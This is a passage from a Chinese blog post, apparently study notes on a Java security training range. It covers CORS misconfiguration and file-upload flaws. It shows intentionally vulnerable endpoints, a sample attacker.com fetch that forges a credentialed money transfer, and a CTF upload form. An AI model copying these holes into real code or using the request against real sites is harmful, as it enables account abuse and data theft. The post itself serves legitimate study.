<td>❌ 不同源</td>
<td>端口不同</td>
</tr>
<tr>
<td><code>https://sub.example.com</code></td>
<td><code>https://example.com</code></td>
<td>❌ 不同源</td>
<td>子域名不同</td>
</tr>
</tbody></table>
<p>同源策略主要限制以下行为：</p>
<ul>
<li><strong>DOM访问</strong>：禁止跨源读取DOM（如通过<code>iframe.contentWindow</code>访问其他页面的DOM）。</li>
<li><strong>Cookie&#x2F;LocalStorage</strong>：禁止跨源读取Cookie或Web存储（但可通过<code>document.cookie</code>的<code>SameSite</code>属性放松限制）。</li>
<li><strong>AJAX请求</strong>：默认禁止跨源发送异步请求（需通过CORS机制绕过）。</li>
<li><strong>JavaScript API</strong>：某些API（如<code>window.open()</code>）受同源策略约束。</li>
</ul>
<p>虽然我都不知道该怎么读取这些东西，但是却把我禁了。</p>
<p><strong>CORS</strong></p>
<p><strong>CORS（Cross-Origin Resource Sharing，跨源资源共享）</strong> 是浏览器基于HTTP头部的一种机制，用于<strong>在受控条件下放宽同源策略（SOP）的限制</strong>，允许跨源请求和响应。</p>
<p>基本流程</p>
<p>当浏览器检测到<strong>跨源请求</strong>（如AJAX、Fetch API）时，会自动附加以下头部，并检查服务器返回的响应头是否允许该请求：</p>
<p>请求</p>
<p>浏览器发送请求时，自动添加 <code>Origin</code> 头部，标明请求来源。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /api/data HTTP/<span class="number">1.1</span></span><br><span class="line">Origin: https:<span class="comment">//your-site.com  # 浏览器自动添加</span></span><br></pre></td></tr></table></figure>

<p>响应</p>
<p>服务器需返回明确的CORS头部（如 <code>Access-Control-Allow-Origin</code>），浏览器才会解除拦截。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Access-Control-Allow-Origin: https:<span class="comment">//your-site.com  # 必须与请求的Origin一致</span></span><br><span class="line">Access-Control-Allow-Credentials: <span class="literal">true</span>  # 允许携带Cookie（可选）</span><br></pre></td></tr></table></figure>

<p>我们来看一些常见的CORS</p>
<table>
<thead>
<tr>
<th align="left"><strong>响应头</strong></th>
<th align="left"><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>Access-Control-Allow-Origin</code></td>
<td align="left">指定允许的源（如 <code>*</code> 或 <code>https://your-site.com</code>）。</td>
</tr>
<tr>
<td align="left"><code>Access-Control-Allow-Methods</code></td>
<td align="left">允许的HTTP方法（如 <code>GET, POST, PUT</code>）。</td>
</tr>
<tr>
<td align="left"><code>Access-Control-Allow-Headers</code></td>
<td align="left">允许的自定义请求头（如 <code>X-API-Key</code>）。</td>
</tr>
<tr>
<td align="left"><code>Access-Control-Allow-Credentials</code></td>
<td align="left">是否允许携带Cookie（需请求头设置 <code>credentials: &#39;include&#39;</code>）。</td>
</tr>
<tr>
<td align="left"><code>Access-Control-Max-Age</code></td>
<td align="left">预检请求的缓存时间（秒）。</td>
</tr>
</tbody></table>
<p>也就是我们可以通过服务器返回的CORS头部获取信息</p>
<p>要成功触发CORS漏洞，需要满足以下条件：</p>
<ul>
<li>服务器设置<code>Access-Control-Allow-Origin</code>头为通配符<code>*</code>或不安全地反射请求的Origin</li>
<li>服务器设置<code>Access-Control-Allow-Credentials: true</code>(当需要窃取带凭证的敏感数据时)</li>
<li>目标站点存在敏感信息或可执行敏感操作</li>
</ul>
<p>我们就能知道自己可以绕过同源策略去搞事情了</p>
<p><strong>&#x2F;vuln&#x2F;orgin</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/origin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuls1</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;origin&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin); <span class="comment">// set origin from header</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);  <span class="comment">// allow cookie</span></span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个路由中设置了两个cors头，我们需要具体认识一下</p>
<p><strong>Access-Control-Allow-Origin</strong></p>
<p>这个cors头后面接url，这个url必须和请求头中的origin一致才能让浏览器允许让该url指向网站的javascript读取响应</p>
<p>如果后面接<code>*</code>则允许所有origin访问，但是不能和<code>Access-Control-Allow-Credentials:ture</code>共用。虽然不知道为什么，应该是因为当这种情况时任何网站（包括恶意站点<code>evil.com</code>）都能获取用户在某网站的登录态（Cookie）</p>
<p><strong>Access-Control-Allow-Credentials</strong></p>
<p>这个后面接true和false，只有为true的时候才允许<strong>跨域请求携带凭证</strong>（如 Cookies、HTTP 认证、TLS 客户端证书等）访问跨域访问其他网站(也就是不同源网站)</p>
<p>必须显式设置为 <code>true</code> 才允许携带凭证，默认情况下跨域请求<strong>不携带</strong>凭证。</p>
<p>具体是否会携带凭证去访问不同源url，还需要由后端代码和前端设置，前提前端设置<code>withCredentials: true</code>。后端代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 恶意网站代码 (https://attacker.com)</span></span><br><span class="line">fetch(<span class="string">&#x27;https://bank.com/api/transfer&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  credentials: <span class="string">&#x27;include&#x27;</span>,  <span class="comment">// 关键：要求携带Cookie</span></span><br><span class="line">  body: JSON.stringify(&#123;to: <span class="string">&#x27;hacker&#x27;</span>, amount: <span class="number">1000</span>&#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>





<p><strong>&#x2F;vuln&#x2F;setHeader</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/setHeader&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuls2</span><span class="params">(HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再前面我们可以知道<code>Access-Control-Allow-Credentials:ture</code>这个不能和origin<code>*</code>共存，相应的前端设置也不行</p>
<p>后面的代码我感觉没什么重要的了，直接放源码看下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;*&quot;)</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/vuln/crossOrigin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">vuls3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 重写Cors的checkOrigin校验方法</span></span><br><span class="line"><span class="comment">     * 支持自定义checkOrigin，让其额外支持一级域名</span></span><br><span class="line"><span class="comment">     * 代码：org/joychou/security/CustomCorsProcessor</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sec/crossOrigin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">secCrossOrigin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * WebMvcConfigurer设置Cors</span></span><br><span class="line"><span class="comment">     * 支持自定义checkOrigin</span></span><br><span class="line"><span class="comment">     * 代码：org/joychou/config/CorsConfig.java</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sec/webMvcConfigurer&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CsrfToken <span class="title function_">getCsrfToken_01</span><span class="params">(CsrfToken token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * spring security设置cors</span></span><br><span class="line"><span class="comment">     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span></span><br><span class="line"><span class="comment">     * 代码：org/joychou/security/WebSecurityConfig.java</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sec/httpCors&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CsrfToken <span class="title function_">getCsrfToken_02</span><span class="params">(CsrfToken token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 自定义filter设置cors</span></span><br><span class="line"><span class="comment">     * 支持自定义checkOrigin</span></span><br><span class="line"><span class="comment">     * 代码：org/joychou/filter/OriginFilter.java</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sec/originFilter&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CsrfToken <span class="title function_">getCsrfToken_03</span><span class="params">(CsrfToken token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * CorsFilter设置cors。</span></span><br><span class="line"><span class="comment">     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行</span></span><br><span class="line"><span class="comment">     * 代码：org/joychou/filter/BaseCorsFilter.java</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/sec/corsFilter&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> CsrfToken <span class="title function_">getCsrfToken_04</span><span class="params">(CsrfToken token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/sec/checkOrigin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">seccode</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">origin</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Origin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果origin不为空并且origin不在白名单内，认定为不安全。</span></span><br><span class="line">        <span class="comment">// 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span></span><br><span class="line">        <span class="keyword">if</span> (origin != <span class="literal">null</span> &amp;&amp; SecurityUtil.checkURL(origin) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Origin is not safe.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-FileUpload"><a href="#5-FileUpload" class="headerlink" title="5.FileUpload"></a>5.FileUpload</h2><p>文件上传漏洞在php中可以太多了，除了普通的图片码之外还有伪协议和各种.htaccess文件操作</p>
<p>我们之前有用过文件上传代码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://c8001f1c-b35d-4d56-913a-fc27198a8ec9.node5.buuoj.cn:81/upload.php?ctf=upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postedFile&quot;</span> <span class="attr">id</span>=<span class="string">&quot;postedFile&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="comment">&lt;!--name要根据题目的源码来调节--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到进行文件上传我们只需要通过html代码进行表单提交即可，然后就是服务器端对收到的数据进行各种过滤和文件头匹配等</p>
<h3 id="upload"><a href="#upload" class="headerlink" title="&#x2F;upload"></a>&#x2F;upload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/any&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>; <span class="comment">// return upload.html page</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">singleFileUpload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span></span><br><span class="line"><span class="params">                                   RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line"><span class="comment">//通过@RequestParam(&quot;file&quot;) MultipartFile file获取到提交的文件，将其各种信息放入MultipartFile对象中</span></span><br><span class="line"><span class="comment">//RedirectAttributes redirectAttributes用于在重定向时传递临时数据</span></span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// 赋值给uploadStatus.html里的动态参数message</span></span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Please select a file to upload&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/file/status&quot;</span>;</span><br><span class="line"><span class="comment">//这个由于redirect:会触发重定向不会进行模板渲染  跳转到新地址/file/status</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Get the file and save it somewhere</span></span><br><span class="line">            <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line"><span class="comment">//获取到文件的字节内容</span></span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line"><span class="comment">//设置文件上传路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"><span class="comment">//进行文件写入</span></span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;You successfully uploaded &#x27;&quot;</span> + UPLOADED_FOLDER + file.getOriginalFilename() + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            redirectAttributes.addFlashAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/file/status&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>由于这个类再一开始就使用<code>@Controller</code>修饰了，所以所有的方法都会进行视图寻找，所以我们访问<code>/any</code>实际上返回的是upload.html，然后upload.html又文件上传至</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">th:action</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>**<code>th:action=&quot;upload&quot;</code>**这是 Thymeleaf 模板引擎的语法最终渲染时会自动添加 <strong>应用上下文路径（Context Path）</strong>,也就是<code>127.0.0.1:8080/upload</code></p>
<p>我们上传的文件保存路径为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPLOADED_FOLDER</span> <span class="operator">=</span> <span class="string">&quot;/tmp/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br></pre></td></tr></table></figure>

<p>Path对象就是IoC容器，通过<code>file.getOriginalFilename()</code>获取到文件完整的名字</p>
<p>看完这个代码，就是一个简单的文件上传代码，将文件储存到<code>/tmp/</code>目录下，然后返回路径，没有任何过滤</p>
<p>我想上传webshell试一下，但是发现源码不仅存放文件上传的是linux路径，而且java项目通过URL访问的机制有点复杂反正这个框架我看不懂，应该是改了一下默认设置</p>
<p>现在目测靶场是将<code>\src\main\resources\static</code>这个路径作为了静态目录，但是源代码中tmp是上传到项目根目录下的，我们无法直接访问到webshell，路由也得看Concroller目录下的控制器</p>
<h3 id="upload-picture"><a href="#upload-picture" class="headerlink" title="&#x2F;upload&#x2F;picture"></a>&#x2F;upload&#x2F;picture</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/pic&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadPic</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uploadPic&quot;</span>; <span class="comment">// return uploadPic.html page</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PostMapping(&quot;/upload/picture&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span><span class="comment">//限定返回文本数据</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadPicture</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile multifile)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (multifile.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Please select a file to upload&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> multifile.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">Suffix</span> <span class="operator">=</span> fileName.substring(fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>)); <span class="comment">// 获取文件后缀名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mimeType</span> <span class="operator">=</span> multifile.getContentType(); <span class="comment">// 获取MIME类型</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> UPLOADED_FOLDER + fileName;</span><br><span class="line">        <span class="comment">//保存路径</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">excelFile</span> <span class="operator">=</span> convert(multifile);</span><br><span class="line"><span class="comment">//这个代码应该是将上传文件转化为磁盘中的文件 先将其转化为File对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断文件后缀名是否在白名单内  校验1</span></span><br><span class="line">        String[] picSuffixList = &#123;<span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.bmp&quot;</span>, <span class="string">&quot;.ico&quot;</span>&#125;;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">suffixFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String white_suffix : picSuffixList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Suffix.toLowerCase().equals(white_suffix)) &#123;</span><br><span class="line"><span class="comment">//将上传文件后缀名改为小写 然后通过equals判断和白名单是否匹配</span></span><br><span class="line">                suffixFlag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!suffixFlag) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;[-] Suffix error: &quot;</span> + Suffix);</span><br><span class="line">            deleteFile(filePath);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Upload failed. Illeagl picture.&quot;</span>;</span><br><span class="line">        &#125;<span class="comment">//如果白名单未匹配到直接删除文件路径</span></span><br><span class="line"></span><br><span 